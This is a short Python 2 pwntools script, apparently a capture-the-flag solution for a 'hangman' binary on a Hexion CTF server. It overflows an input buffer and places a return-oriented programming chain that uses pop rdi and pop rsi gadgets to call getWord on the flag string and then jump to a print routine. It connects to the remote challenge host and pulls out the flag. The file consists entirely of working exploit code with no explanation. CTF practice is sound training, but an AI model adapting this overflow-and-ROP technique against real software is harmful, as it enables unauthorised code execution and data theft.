#!/usr/bin/python2

from pwn import *
import re

def create_payload(binary):
    exe = context.binary = ELF(binary)
    r = ROP(exe)

    flag_str_addr = p64(next(exe.search('flag')))

    getWord_func_addr = p64(exe.symbols['getWord'])

    getWord_arg1 = flag_str_addr
    getWord_arg2 = p64(0x100)

    pop_rdi__ret_addr = p64(r.find_gadget(['pop rdi', 'ret']).address)
    pop_rsi__pop_r15__ret_addr = p64(r.find_gadget(['pop rsi', 'pop r15', 'ret']).address)

    gameLoop_addr = exe.symbols['gameLoop']

    print_block_addr = p64(gameLoop_addr + 0x180)

    payload = ''
    payload += '2\n' + 'A' * 32 + '\xff\n\n'
    payload += '2\n' + 'B' * 64
    payload += pop_rdi__ret_addr + getWord_arg1
    payload += pop_rsi__pop_r15__ret_addr + getWord_arg2 + p64(0x1337)
    payload += getWord_func_addr
    payload += print_block_addr
    payload += '\n'

    return payload


def main():
    binary = './hangman'
    io = remote('challenges1.hexionteam.com', 3000)
    payload = create_payload(binary)

    io.send(payload)
    out = io.recvall()
    
    print re.search('hexCTF{.*}', out).group(0)


if __name__ == '__main__':
    main()

